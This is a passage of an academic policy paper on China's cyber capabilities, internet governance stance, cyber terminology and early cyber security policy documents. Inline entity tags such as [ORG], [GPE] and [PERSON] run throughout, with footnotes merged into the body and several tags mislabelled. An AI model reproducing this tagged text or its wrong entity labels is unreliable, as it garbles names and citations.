believing the [NORP] Chinese hacking to be unprecedented in the history of espionage : \u2018 Exabytes of data have been copied from universities , industrial labs , and government facilities . The secrets behind everything from pharmaceutical formulas to bioengineering designs , to nanotechnology , to weapons systems , to everyday industrial products have been taken by [ORG] the People \u2019s [ORG] Liberation [ORG] Army and by private hacking groups and given to [GPE] China . \u2019 [ORG] Clarke , [PERSON] Richard [PERSON] A. , and [PERSON] Robert [PERSON] K. [PERSON] Knake . Cyber War : The Next Threat to [ORG] National [ORG] Security and What to Do About It . Ecco , [DATE] 2010 , p. [CARDINAL] 59 . [CARDINAL] 3 For an overview of all publicly reported intrusions attributed to [GPE] China from [DATE] 2005 to [DATE] 2013 , see [PERSON] Lindsay , [PERSON] Jon [PERSON] R. and [PERSON] Tai [PERSON] Ming [PERSON] Cheung . \u2018 [LAW] Chapter [LAW] 3 : From Exploitation to Innovation , \u2019 pp . 58 [DATE] - [DATE] 61 in [PERSON] Lindsay , [PERSON] Jon [PERSON] R. , [PERSON] Tai [PERSON] Ming [PERSON] Cheung , and [PERSON] Derek [PERSON] S. [PERSON] Reveron ( eds ) [GPE] China and Cybersecurity : Espionage , Strategy and Politics in the Digital Domain . [ORG] Oxford [ORG] University [ORG] Press , [CARDINAL] 2015.5While some experts suggest that [GPE] China \u2019s cyber units have so far \u2018 outmanned and outclassed\u20194 their adversaries , the [LOC] West has actually demonstrated firm responses . For instance , several [NORP] Chinese telecommunication companies such as [ORG] Huawei have been banned from contracting and acquiring any broadband network providers in the [GPE] US and [GPE] Australia.5 It seems that whichever direction the [NORP] Chinese offensive cyber capabilities develop , the [LOC] West is unwilling to accept any growing danger to its private information , cyber infrastructure or security in general.6In order to establish a comprehensive understanding of [GPE] China \u2019s cyber attitude , it is of paramount importance to know its strengths and weaknesses . For that purpose , this paper aims to give readers a detailed overview of [GPE] China \u2019s cyber capabilities , related documents and strategies , and the general command structure of its tactical execution layer . Importantly , the country \u2019s distinct approach raises the necessity of introducing the general national strategic thinking and framework into which cyber falls . The paper acts as a comprehensive starting point for anyone aiming to get a foothold on affairs related to [GPE] China and cyber . As with most states , [GPE] China is heavily dependent on technology , making the government highly concerned about developments regarding the internet and the information flow that it generates . The [NORP] Chinese see uncontrolled information as a threat to the regime , paying great efforts to obtain the economic gains that the internet provides , but simultaneously maintaining political control.7 It is believed that , for the [NORP] Chinese , the whole concept of the internet is built around controlling information through real - time censorship , constituting a completely different view from that in the West.8 Indeed , ever since the internet became a publicly available communication platform in [GPE] China , the question was not whether to control it , but rather how to control it.9 The most explicit example of such regulatory measures is of course [FAC] the [FAC] Great [FAC] Firewall [FAC] of [FAC] China , which by monitoring all traffic in [NORP] Chinese cyberspace enables the authorities to deny access to a variety of selected websites and disconnect all [NORP] Chinese networks from the global internet network . Other than being afraid of the growth of internal opposition through information , the government is also very sensitive about foreign information systems . Despite local technology and telecom companies \u2019 efforts to supply high quality products for domestic use , a large part of technology connected to [NORP] Chinese networks still originates from the [LOC] West . [NORP] Chinese officials are convinced that these systems are equipped with [GPE] Trojan horses and loopholes to steal [GPE] China \u2019s national secrets and prevent its further economic upsurge.10 To counter these fears , the government has4 [GPE] Hannas , [PERSON] William [PERSON] C. , [PERSON] James [PERSON] C. [PERSON] Mulvenon , and [PERSON] Anna [PERSON] B. [PERSON] Puglisi . [NORP] Chinese Industrial Espionage : Technology Acquisition and Military Modernization . Routledge , [DATE] 2013 . [CARDINAL] 5 Stark , [PERSON] Jill . \u2018 [GPE] US [ORG] Follows [ORG] Australia in [FAC] Naming [FAC] Huawei as a Possible Security Threat . \u2019 The Sydney Morning Herald . [CARDINAL] 9 [DATE] Oct. [DATE] 2012 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url security-threat-20121007-277ad.html > . [CARDINAL] 6 [ORG] The [ORG] US [ORG] National [ORG] Security [ORG] Agency ( [ORG] NSA ) has itself hacked into computers belonging to [ORG] Huawei and [ORG] China [ORG] Telecom , a fact that became public with the [GPE] Snowden leaked documents evidencing the [NORP] American worldwide online spying . See more at Sanger , [LAW] David [LAW] E. , and [PERSON] Nicole [PERSON] Perlroth . \u2018 N.S.A. Breached Chinese Servers Seen as [ORG] Security [ORG] Threat . \u2019 [ORG] The [ORG] New [ORG] York [ORG] Times . [CARDINAL] 22 Mar. [DATE] 2014 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url peril.html?_r=0 > . 7 Grauman , [GPE] Brigid . Cyber - security : [WORK_OF_ART] The [WORK_OF_ART] Vexed [WORK_OF_ART] Question [WORK_OF_ART] of [WORK_OF_ART] Global [WORK_OF_ART] Rules . Report by [ORG] Security [ORG] & [ORG] Defence [ORG] Agenda , [DATE] 2012 , p. [CARDINAL] 55 . [CARDINAL] 8 [PERSON] David [PERSON] Bandurski , cited in [GPE] Lococo , [PERSON] Edmond , and [PERSON] Keith [PERSON] Zhai . \u2018 [GPE] China Seeks Global Internet Influence at CEO Forum on [ORG] Canal [ORG] Bank . \u2019 [PERSON] Bloomberg [PERSON] Technology . [DATE] 18 [DATE] Nov. [DATE] 2014 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 18 / china - seeks - global - internet - influence - at - ceo - forum - on - canal - bank > . 9 Creemers , [ORG] Rogier . \u2018 Cyber - Leninism : History , Political Culture and the Internet in [GPE] China . \u2019 ( [DATE] 2015 ): p.10 . Draft available at < url 10 Ernst , [PERSON] Dieter . Indigenous Innovation and Globalization \u2013 the Challenge for China \u2019s Standardization Strategy . Report by the East - West Center , [DATE] 2010 , p. [CARDINAL] 33 . < url heavy controls over the information security industry , deterring foreign investors , especially the [NORP] Americans , from seeking business opportunities in [GPE] China . Yet , demonstrating how far the [NORP] Chinese still are from the desired technological independence , [GPE] Beijing was not particularly pleased when in [DATE] early [DATE] 2014 , [ORG] Microsoft decided to stop customer support for Windows XP , the operating system used extensively in [NORP] Chinese government computers . Public discussion about the nature and future of cyberspace was brought to the international level only very recently.11 In [DATE] 2013 , [ORG] the [ORG] United [ORG] Nations [ORG] Group [ORG] of [ORG] Governmental [ORG] Experts , including the representative from [GPE] China , concluded that the [ORG] UN Charter and international law are fully applicable to state behaviour in cyberspace , a position which has also been taken by [ORG] NATO countries.12 However , this position impliedly assumes the use of already existing institutional framework , which , facilitated by [ORG] ICANN , is more multi - stakeholder than intergovernmental . The latter would better allow each government to regulate the internet itself , the main premise of [GPE] China \u2019s strong belief in so- called \u2018 cyber [ORG] sovereignty\u2019 . [GPE] China has introduced its alternative position through [ORG] the [ORG] Shanghai [ORG] Cooperation [ORG] Organisation ( SCO ) in [ORG] the [ORG] UN [ORG] General [ORG] Assembly , together with [GPE] Russia and several [NORP] Central [NORP] Asian countries , [ORDINAL] first in [DATE] 2011 , with a revised version in [DATE] January [DATE] 2015.13 A common line between the [ORG] SCO countries is a belief in the primacy of the nation state , which should be carried over into cyberspace.14 According to a report by the [GPE] US - China Security Review Commission , this allows the [NORP] Chinese to dwell on [CARDINAL] two corollaries . [ORDINAL] Firstly , the users of cyberspace , both domestic and foreign citizens within a state \u2019s territory , should be controlled by the host state , a clear contradiction of the Western position which supports a liberal cyberspace respecting human rights.15 In [GPE] China \u2019s political culture , maintaining social order is unquestionably more important than individual privacy.16 [ORDINAL] Secondly , [GPE] China is particularly sensitive in exercising its right to sovereignty in cyberspace and does not want it to be interfered with by any other state or international organisation.17 Therefore , somewhat contradictory to its position regarding the [ORG] UN report , [GPE] China does not see international law as the main regulator of cyberspace , but prefers each state setting its own rules.18 [GPE] China has also criticised [LOC] the [LOC] Tallinn [LOC] Manual as an effort to manipulate cyberspace through law.19Another concern characterising [GPE] China \u2019s attitude towards general governance of cyberspace is its antipathy to the [GPE] US . As many official statements by the [NORP] Chinese press , [ORG] the People \u2019s [ORG] Liberation [ORG] Army ( PLA ) and academics have shown , [GPE] China is concerned about the [GPE] US using its status and influence as the world \u2019s leading technology power to establish international rules and norms favourable to the [GPE] US . Thus , [GPE] China often justifies its actions in cyberspace as a response to hostile developments by the [GPE] US military.20 A point further strengthening this understanding is the fact that ICANN11 When talking about rules in the internet , it is necessary to distinguish between [CARDINAL] two separate concepts . [ORDINAL] First , \u2018 internet governance \u2019 is a term for norms , rules and procedures that shape the use of the internet in general , and is facilitated by [ORG] the [ORG] Internet [ORG] Corporation [ORG] for [ORG] Assigned [ORG] Names and [ORG] Numbers ( [ORG] ICANN ) . Different from \u2018 Internet governance \u2019 is the framework of how a sovereign state behaves in cyberspace . [ORG] 12 [ORG] Group [ORG] of [ORG] Governmental [ORG] Experts [ORG] on [ORG] Developments in [ORG] the [ORG] Field [ORG] of [ORG] Information [ORG] and [ORG] Telecommunications in the Context of International Security . Report of [ORG] the [ORG] United [ORG] Nations [ORG] General [ORG] Assembly , [DATE] 2013 . < url and [ORG] North [ORG] Atlantic [ORG] Treaty [ORG] Organization . Cyber Defence Pledge . [DATE] 8 [DATE] July [DATE] 2016 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url 13 International Code of Conduct for Information Security . Report of [ORG] the [ORG] United [ORG] Nations [ORG] General [ORG] Assembly , [DATE] 2015 . < url [CARDINAL] 14 Grauman , [DATE] 2012 , p. [CARDINAL] 56 . [CARDINAL] 15 [PERSON] Hsu , [PERSON] Kimberly , and [PERSON] Craig [PERSON] Murray . [GPE] China and International Law in [PERSON] Cyberspace . Report by [ORG] the [ORG] U.S.-China [ORG] Economic [ORG] and [ORG] Security [ORG] Review [ORG] Commission , [DATE] 2014 , p. [CARDINAL] 2 . [CARDINAL] 16 Grauman , [DATE] 2012 , p. [CARDINAL] 56 . [CARDINAL] 17 [PERSON] Hsu and [GPE] Murray , [DATE] 2014 , p. [CARDINAL] 2 . For an example of the [NORP] Chinese position on these issues , see \u2018 [GPE] China \u2019s Perspective on Building a Peaceful , Secure , Open and Cooperative Cyberspace . \u2019 UNIDIR Conference . [DATE] 10 [DATE] Feb. [DATE] 2014 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 18 Segal , Adam . \u2018 The Deepening Divide in [ORG] U.S.-China [ORG] Cyber [ORG] Relations . \u2019 [ORG] The [ORG] National [ORG] Interest . [CARDINAL] 29 [DATE] Oct. [DATE] 2014 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 19 The Tallinn Manual disagrees with any call for new regulations to govern cyberspace . [CARDINAL] 20 [PERSON] Hsu and [GPE] Murray , [DATE] 2014 , p. [CARDINAL] 1.7is located in [GPE] Los [GPE] Angeles and is under [GPE] US jurisdiction , even though it is independent of the [GPE] US government . Moreover , as the [GPE] US is a founding member of the majority of the world \u2019s international institutions , [GPE] China believes it to have exceptional control over cyberspace and its governing principles . For example , during [ORG] the [ORG] Budapest [ORG] Conference [ORG] on [ORG] Cyberspace in [DATE] 2012 , the official statement of the [NORP] Chinese representative included points that criticised the [GPE] US for militarising cyberspace and unfairly allocating cyber resources among only developed states to maintain its control.21 This is why several [NORP] Chinese experts believe [GPE] China has a key role in promoting a new , \u2018 common and inclusive global internet governance\u201922 model that redistributes digital resources and governance rights more equitably . Admittedly , such a model would probably lack legitimacy in the eyes of a large part of the international community.23The different understandings of internet governance can be seen as part of the general existential competition between [GPE] China and the [LOC] West , which often asks whether [GPE] China will continue growing as the peaceful lion as it claims , or whether conflict with the liberal democratic ideologies is bound to occur . As the [GPE] US undeniably has the greatest economic and military capabilities among the [LOC] West , it has taken the lead in containing [GPE] China \u2019s growth . Whereas physical confrontation has so far been avoided , the situation is certainly fiercer in cyberspace , which both [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense ( DoD ) and the [ORG] PLA have begun to view as a new domain of conflict , seeing cyber espionage and malicious activities from both parties , who refuse to admit their state - level involvement and rather blame their opponent.24 [GPE] China considers itself equal with the [GPE] US when it comes to comparing the [CARDINAL] two countries \u2019 size , power and influence in the online field , which creates tensions over who should dominate the digital world.25 [ORG] Understandably , such tensions frustrate cooperative interaction not only in the cyber domain , but also in the economic and political fields . After the [GPE] US indicted [CARDINAL] five [ORG] PLA officers for stealing data from [NORP] American corporations in [DATE] May [DATE] 2014,26 many saw the cyber - agreement between President [PERSON] Xi and President [PERSON] Obama in [DATE] September [DATE] 2015 as a positive development . Both Presidents pledged not to knowingly conduct or support cyber theft , including that of intellectual property , trade secrets , or confidential business information in [GPE] general.27 Some cyber security firms have indeed noted a reduced number of attacks against [NORP] American businesses , but this might be due to improved tactics making the attackers harder to detect , or simply a turn to new , uninformed targets in other countries , and not because of any deep respect for the agreement.28 [ORG] FireEye \u2019s recent report states that the [GPE] China - based units \u2019 operations against [GPE] US companies saw a decline in frequency [DATE] a [DATE] year before the [PERSON] Xi [PERSON] - [PERSON] Obama agreement and have since become more focused and calculated21 [PERSON] Hurwitz , [PERSON] Roger . \u2018 A Scene from the Road to Cyber Governance : [ORG] The [ORG] Budapest [ORG] Cyberspace [ORG] Conference . \u2019 MUNK School of Global Affairs . [DATE] 26 [DATE] Feb. [DATE] 2013 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url governance - the - budapest - cyberspace - conference/ > . [CARDINAL] 22 [PERSON] Jiang , [PERSON] Li , [PERSON] Zhang [PERSON] Xiaolan , and [PERSON] Yu [PERSON] Feibao . \u2018 Deadlock in International Cooperation Regarding Cyber Security and Its Solutions . \u2019 [ORG] Xiandai [PERSON] Guoji [PERSON] Guanxi [PERSON] - [PERSON] Contemporary [PERSON] International [PERSON] Relations 9 ( 2013 ) , cited in [GPE] Liffran , [PERSON] Camille . \u2018 [NORP] Chinese Perspectives on [WORK_OF_ART] Cyber [WORK_OF_ART] Security [WORK_OF_ART] and [WORK_OF_ART] International [WORK_OF_ART] Relations . \u2019 [GPE] China 's Expanding Cyberspace ( [DATE] 2014 ): pp . [CARDINAL] 5 - 7 . < url /ChinaAnalysisEng_June2014.pdf > . [CARDINAL] 23 The subject of a broader - based internet governance model was brought up at [EVENT] the [EVENT] World [EVENT] Conference [EVENT] on [EVENT] International [EVENT] Telecommunications in [DATE] 2012 . The outcome was a clear split between nations favouring the introduction of a multilateral governance model ( most of the so - called [ORG] BRICS countries , with the exception of [GPE] India , and developing countries ) and those opposed to it , including the [GPE] USA , [ORG] EU member states , [GPE] Australia and [GPE] Japan . [CARDINAL] 24 [PERSON] Lindsay , [PERSON] Jon . [GPE] China and Cybersecurity : Political , Economic , and Strategic Dimensions . Report by [ORG] the [ORG] University [ORG] of [ORG] California [ORG] Institute [ORG] on [ORG] Global [ORG] Conflict [ORG] and [ORG] Cooperation , 2012 , p. [CARDINAL] 1 . < url [ORG] Reveron / Documents / [ORG] China - and - Cybersecurity - Workshop - Report - final.aspx > . [CARDINAL] 25 Cyrus Mewawalla , cited in [GPE] Lococo and [GPE] Zhai , [DATE] 2014 . [CARDINAL] 26 This was an act of seemingly no great significance , but at the time conveyed a highly symbolic meaning about the countries \u2019 bilateral relations in the cyber field in general . See more at [GPE] Tiezzi , [FAC] Shannon . \u2018 [GPE] US Indicts [CARDINAL] 5 PLA Officers For Hacking , Economic Espionage . \u2019 The Diplomat . [CARDINAL] 20 [DATE] May [DATE] 2014 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url for - hacking - economic - espionage/ > . [CARDINAL] 27 \u2018 The Obama - Xi Cyber Mirage . \u2019 [ORG] The [ORG] Wall [ORG] Street [ORG] Journal . [CARDINAL] 27 [DATE] Sept. [DATE] 2015 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 28 Harold , [PERSON] Scott [PERSON] Warren . \u2018 The U.S.-China Cyber Agreement : A Good First Step . [ORG] \u2019 [ORG] RAND [ORG] Corporation . [DATE] July [DATE] 2016 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url have maintained their level of success . The report attributes such changes to military and political changes within [GPE] China , the frequent exposure of [NORP] Chinese hackers , as well as the pressure and threat of sanctions from the US.29 Nevertheless , the overall situation has remained fairly static and therefore [FAC] the [FAC] Xi [FAC] - [FAC] Obama agreement should not be seen as a turning point . It is essential to note that the foundation of such behaviour , as well as [NORP] Chinese thinking on asymmetric warfare in general and particularly on cyber - war , was laid down in [PERSON] Unrestricted [PERSON] Warfare \u2013 a book written by [CARDINAL] two [ORG] PLA colonels [PERSON] Qiao [PERSON] Liang and [PERSON] Wang [PERSON] Xiangsui in [DATE] 1999 to provide a strategy of how [GPE] China as a weaker country could defeat a technologically superior foe outside the scope of using hard military power . Part of the [NORP] American media irresponsibly depicted the book a grand strategy to destroy the [GPE] US due to its precise scrutiny of the [NORP] American military . Indeed , the colonels identified the [GPE] US military \u2019s main weakness as its dependence on [ORG] ICT - networked systems through which the [NORP] Chinese could obtain an asymmetric advantage.30 According to SIPRI \u2019s database , at the time of the book \u2019s publication , the difference in the [CARDINAL] two countries \u2019 military expenditure was about 15 - fold . Even though the gap has closed significantly , the [GPE] US defence budget is still around [CARDINAL] three times that of China.31 Therefore , if the front door remains closed , the smart player will try to sneak in through the back door or a window . That is exactly what the [NORP] Chinese strategy is about \u2013 knowing that even with wholesale modernisation , it will not be the equal of the [GPE] US military for [DATE] decades , and so [GPE] China is ready to win any confrontation without physical battles by using efficient and overwhelming cyber - attacks.32However , even though the book has predominantly been characterised as a plan to defeat the [GPE] US , it really should be perceived as an opportunity to understand [GPE] China \u2019s different operational thinking on the power struggle in general . This is something that needs to be noticed and learned not only by the [GPE] US , but also by other Western powers if they want to be on par with [GPE] China in the cyber race . [PERSON] Colonels [PERSON] Qiao and [PERSON] Wang noted that it is vital to recognise that the battlefields in future wars will be traditionally non - war spheres like cyberspace , which strongly affect national security.33In looking into [NORP] Chinese cyber developments , one should also be aware of their dissimilar terminology for cyber as compared to [ORG] the [ORG] North [ORG] - [ORG] Atlantic [ORG] area.34 [ORG] Efforts have been made to reconcile the mismatches , but these continue to be met by a remarkable lack of enthusiasm . What can be done for the purpose of this research is to explain the most significant differences . To begin with , the [NORP] Chinese do not use the word cyber as extensively as the West . They perceive everything related to cyber developments as part of a broader transformation from an industrial society to an information society , referring to the process as informationisation or informatisation ( the latter is normally used in translations and has29 Red Line Drawn : China Recalculates Its Use of Cyber Espionage . Report by [ORG] FireEye , [DATE] 2016 , pp . [CARDINAL] 12 , [CARDINAL] 15 . < url [CARDINAL] 30 [PERSON] Qiao , [PERSON] Liang , and [PERSON] Wang [PERSON] Xiangsui . [PERSON] Unrestricted [PERSON] Warfare . PLA Literature and [ORG] Arts [ORG] House , [DATE] 1999 . Unofficial translation of the book is available at Cryptome \u2019s website at : < url [DATE] 31 [DATE] \u2018 SIPRI [DATE] Military [DATE] Expenditure [DATE] Database . \u2019 SIPRI . [DATE] 2016 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 32 [ORG] Clarke and Knake , [DATE] 2010 , p. [CARDINAL] 53 . [CARDINAL] 33 [PERSON] Qiao and [ORG] Wang , [DATE] 1999 , pp . [CARDINAL] 144 - 145 , cited in [GPE] Thomas , [PERSON] Timothy [PERSON] L. [PERSON] The [ORG] Dragon 's [ORG] Quantum [ORG] Leap . [ORG] Foreign [ORG] Military [ORG] Studies [ORG] Office , [DATE] 2009 , p. [CARDINAL] 27 . [CARDINAL] 34 As [PERSON] Keir [PERSON] Giles and [PERSON] William [PERSON] Hagestad point out in their comprehensive paper on [LANGUAGE] English , [NORP] Chinese and [NORP] Russian mismatching cyber definitions , the common disparities need to be removed to achieve a mutual understanding on governing cyberspace . It is easier to accept the current situation , but a better solution may exist in composing an international cyber lexicon that addresses all the relevant terms . This , however , will be a tremendous challenge due to the opposition of [GPE] China and other alternative players like [GPE] Russia , who find it more appealing to seek cooperation among themselves and other like - minded countries instead of engaging into a constructive dialogue with the [GPE] US - led [LANGUAGE] English - speaking countries . See more at : Giles , Keir , and [PERSON] William [PERSON] Hagestad [PERSON] II . Divided by [PERSON] a [PERSON] Common Language : Cyber Definitions in [LANGUAGE] Chinese , [LANGUAGE] Russian and [LANGUAGE] English . Proceedings of [ORDINAL] 5th International Conference on Cyber Conflict , Tallinn . [DATE] 2013 . [ORG] NATO [ORG] CCDCOE [ORG] Publications . < url use).35 Similarly , while the [LOC] West classifies cyberspace as the global domain covering the use of electronics , interdependent networks of internet , and other telecommunication networks and data,36 the [NORP] Chinese term closest to what would translate as cyberspace merely entails the necessary components of a connected device and actions related to using it.37 For the [NORP] Chinese , cyberspace is thus only a subset of information space \u2013 the landscape for the largest scale communication to the world \u2019s population , which includes human information processing and cognitive space.38information technologyinfrastructureincluding theIt is also important to distinguish between cyber security and information security . The [LOC] West , including the [ORG] NATO allies , sees cyber security as the security of computer and information systems as physical and logical entities , and information assurance or information security as referring to security of the content . The [NORP] Chinese , however , view both the information systems and the content of information as integral and connected parts of information security.39 This holistic understanding thus extends the use of the term from purely [ORG] ICT - related issues to mental aspects and explains why the [NORP] Chinese government \u2019s approach to information security has been control - seeking and restrictive . Likewise , the [NORP] Chinese have adopted information warfare as a distinct , yet integrated and discrete discipline , which is incompatible with the Western view , which has recently been dividing the concept into smaller and separate disciplines , such as psychological operations and strategic communications . The [NORP] Chinese use cyber warfare only when describing [NORP] Western countries and their cyber operations.40It would be a major challenge to have each player adopt a single lexicon , but as long as one understands what is behind the varying definitions , it will become easier to evaluate cyber relationships between [GPE] China and the West . In this paper , unless specifically referring to a [NORP] Chinese initiative or particular concept , cyber and its derivations should be read in the conventional Western understanding . However , dissimilar terminology is certainly not the hardest of the obstacles on the way to elaborating sophisticated cyber cooperation between [GPE] China and the [LOC] West . [GPE] China \u2019s notion of sovereignty and independence has restrained it from considering [NORP] Western points of view and international law \u2019s efficiency in cyberspace . Reluctant to adopt the [GPE] US - led positions , the [NORP] Chinese prefer to control cyberspace through its government and military , as opposed to the [LOC] West which prefers a liberal environment , giving space to individuals and private corporations . Having analysed [GPE] China \u2019s previous behaviour and firmly held attitudes , it seems unlikely that its stance will see a significant change any time soon . Therefore , instead of fighting the red dragon in the dark and without much success , it might be more useful to get to know her first . However , it is a large and complicated task due to continuing uncertainties that are not only a problem for the outsiders , but also for the [NORP] Chinese themselves . In [DATE] 1999 , colonels [PERSON] Qiao and [ORG] Wang presented dependence on [ORG] ICT - networks as the main weakness of the [GPE] US military . [DATE] Today , the [ORG] PLA has reached a point where its reliance on information technology is no less than that of the [NORP] Americans . At the same time , cyber security is also concerned with industrial and civilian developments where public and private sector actors \u2019 interests often mismatch , making it difficult to implement a streamlined approach . Logically enough , cyber security has become one of the priorities for both the [ORG] PLA and the [NORP] Chinese government , which has taken various steps to address the challenges of legal loopholes , incomplete institutions , and35 [PERSON] Zhao , Xiaofan . \u2018 Practice and Strategy of Informatization in [GPE] China . \u2019 State Council Informatization Office Department of IT Application Promotion . [GPE] Shanghai . [DATE] 18 [DATE] Oct. [DATE] 2006 . < url [CARDINAL] 36 \u2018 Cyberspace . \u2019 Defense Technical Information Center of [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url 37 Giles and [GPE] Hagestad , [DATE] 2013 , p. [CARDINAL] 7 . [CARDINAL] 38 Ibid . [CARDINAL] 39 [PERSON] Thomas , [PERSON] Timothy [PERSON] L. [PERSON] \u2018 [PERSON] Information [PERSON] Security [PERSON] Thinking : A Comparison of [GPE] U.S. , [NORP] Russian , And Chinese Concepts . \u2019 Foreign Military Studies Office Publications . [DATE] July [DATE] 2001 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url 40 Giles and [GPE] Hagestad , [DATE] 2013 , p. [CARDINAL] 9.10unsatisfactory education among the public.41 As a bystander , it is not easy to understand what exactly [GPE] China \u2019s cyber policies are built on , as rather than a single official document systematically listing out its cyber strategy , the policies derive from several key founding documents that have been adopted over time and have been most influential in policy - making in the cyber sphere . However , analysing these together allows gaining a rather sharp picture of [GPE] China \u2019s overall position in cyberspace . Even though many of the adopted initiatives have seen only limited success , this chapter will shed light on the most important documents together with their main content and goals . It will conclude by analysing [GPE] China \u2019s new strategic direction taken after establishing [ORG] the [ORG] Central [ORG] Leading [ORG] Small [ORG] Group [ORG] for [ORG] Internet [ORG] Security [ORG] and [ORG] Informatisation in [DATE] February [DATE] 2014.Prior to establishing [GPE] China \u2019s national civilian cyber security plan , referred to as Document 27 , several working groups had touched upon related issues . However , lack of coordination and constant restructuring have continuously caused much uncertainty for all the players . A national - level focus on information technology began in [DATE] 1986 with the establishment of [ORG] the [ORG] State [ORG] Economic [ORG] Information [ORG] Management [ORG] Leading [ORG] Small [ORG] Group , and continued in [DATE] 1999 and [DATE] 2001 with the establishment and re - establishment of [ORG] the [ORG] State [ORG] Informatisation [ORG] Leading [ORG] Group ( SILG ) . In [DATE] 2003 , [ORG] the [ORG] State [ORG] Network [ORG] and [ORG] Information [ORG] Security [ORG] Coordination [ORG] Small [ORG] Group ( SNISCSG ) was created as a sub - group under SILG , chaired by the current Premier [PERSON] Li [PERSON] Keqiang . The objectives for these [CARDINAL] three groups were to develop indigenous information technologies and place them into a national security context.42 [GPE] China \u2019s tenth Five [DATE] - Year [DATE] Plan [DATE] of [DATE] 2001 prioritised developing domestic information security infrastructure and initiating large - scale investments to both state - sponsored and private IT - firms , which were to focus on anti - malware protection and general internet security.43 In [DATE] the [DATE] early [DATE] 2000s , [ORG] ICT development received attention from both President [PERSON] Jiang [PERSON] Zemin and President [PERSON] Hu [PERSON] Jintao who started to talk about national security and economic security as an indivisible pair , hence promoting the need to \u2018 leapfrog \u2019 over the competitors in order to turn [GPE] China \u2019s historical disadvantages into strengths through innovative [GPE] development.44In [DATE] 2003 , [ORG] SNISCSG issued Document [CARDINAL] 27 , which implemented major cyber security related policies and national strategies , including disaster recovery , incident management and e - government security plans.45 The initially classified Document [CARDINAL] 27 \u2019s persisting idea was the concept of \u2018 active defence\u2019,46 drawing various policies for protecting critical infrastructure , enhancing encryptions and dynamic monitoring , improving indigenous innovation , and also touching upon cyber security \u2019s leadership , better coordination and funding . Document [CARDINAL] 27 was helpful in formulating necessary policies , but the dismissal of SNISCSG in [DATE] 2008 left [GPE] China \u2019s civilian cyber security disorganised , leading to various separate , unaligned policy initiatives from different bodies . Even though SNISCSG was reconstituted in [DATE] 2009 , no open records of its meetings are available and various ministries have been assigned the responsibilities to41 [PERSON] Li , [PERSON] Yuxiao . \u2018 [ORG] Cyberspace [ORG] Security and [ORG] International [ORG] Cooperation in [GPE] China , \u2019 p.4 in [GPE] Lindsay , [DATE] 2012 . [CARDINAL] 42 [PERSON] Wang , [GPE] Yukai , \u2018 Zhongyang wangluo anquan yu xinxihua lingdao xiaozu de youlai ji qi yinxiang ( The [ORG] Origins and [ORG] Influence [ORG] of [ORG] the [ORG] Central [ORG] Network [ORG] Security and [ORG] Informatisation [ORG] Leading [ORG] Small [ORG] Group ) , [PERSON] \u2019 [PERSON] Zhongguo [PERSON] Gongchandang [PERSON] Xinwen [PERSON] Wang ( [ORG] Communist [ORG] Party [ORG] of [ORG] China [ORG] News [ORG] Network ) , [CARDINAL] 3 Mar. [DATE] 2014 . < url people.com.cn/n/2014/0303/c40531-24510897.html > , cited in [GPE] Chang , Amy . Warring State : [GPE] China \u2019s Cybersecurity Strategy . Report by [ORG] the [ORG] Center [ORG] for [ORG] a [ORG] New [ORG] American [ORG] Security , [DATE] 2014 , p. [CARDINAL] 16 . < url [CARDINAL] 43 \u2018 [GPE] China : Summary of the Tenth Five [DATE] - Year [DATE] Plan ( [DATE] 2001 [DATE] - [DATE] 2005 ) \u2013 Information Industry \u2019 . Available at < url 44 [PERSON] Jiang , [PERSON] Zemin . \u2018 Lun zhongguo xinxi jishu chanye fazhan ( On [ORG] China \u2019s [ORG] Information [ORG] Technology [ORG] Industry [ORG] Development ) , \u2019 [ORG] Xinhua , [DATE] 22 [DATE] Apr. [DATE] 2009 . < url cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 16 . [PERSON] 45 [PERSON] Li , [DATE] 2012 , p. [CARDINAL] 5 . [CARDINAL] 46 \u2018 Active defence \u2019 in [NORP] Chinese understanding is based on [PERSON] Mao Zedong \u2019s idea of attacking only after receiving an attack . Explained in [GPE] Blasko , [PERSON] Dennis [PERSON] J. [PERSON] \u2018 Chapter 3 : [WORK_OF_ART] The [WORK_OF_ART] Evolution [WORK_OF_ART] of [WORK_OF_ART] Core Concepts : People \u2019s [WORK_OF_ART] War , Active Defense , and [ORG] Offshore [ORG] Defense , \u2019 in [PERSON] Kamphausen , [PERSON] Roy , [PERSON] David [PERSON] Lai , and [ORG] Travis [ORG] Tanner ( eds ) . Assessing [ORG] the People \u2019s [ORG] Liberation [ORG] Army in [ORG] the [ORG] Hu [ORG] Jintao [ORG] Era , [ORG] Strategic [ORG] Studies [ORG] Institute , [DATE] 2014 , p. [CARDINAL] 81 , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 20.11implement Document [CARDINAL] 27 \u2019s [PRODUCT] strategies.47 [PRODUCT] Materials in English about Document [CARDINAL] 27 are limited , and therefore the exact directions on how and through which means the strategies were to be executed also remain unclear . Since [DATE] February [DATE] 2006 , all information security developments and related policies can in [CARDINAL] one way or another be linked to [GPE] China \u2019s [DATE] 15 [DATE] - [DATE] year grand strategy for future innovation . Issued by [ORG] the [ORG] State [ORG] Council , it is more precisely entitled the \u2018 [ORG] The [ORG] National [ORG] Programme [ORG] for [ORG] the [ORG] Development [ORG] of [ORG] Science [ORG] and [ORG] Technology in the Medium and Long Term 2006- 2020 \u2019 . [PERSON] Dieter [PERSON] Ernst from the East - West Centre considers this document a cornerstone to [GPE] China \u2019s overall standardisation strategy , which consists of various legal documents and policy initiatives . He also believes that the strategy should be analysed in a broader context with [GPE] China \u2019s goal to level up with the [NORP] Western life quality and income level , not only when 